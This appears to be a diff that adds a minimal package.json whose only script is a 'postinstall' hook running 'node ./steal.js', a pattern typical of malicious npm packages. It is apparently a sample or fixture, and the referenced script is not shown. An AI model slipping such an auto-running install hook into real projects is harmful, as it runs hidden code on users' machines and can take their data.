@@ -1,0 +1,6 @@
+{
+  "name":"x",
+  "scripts": {
+    "postinstall": "node ./steal.js"
+  }
+}
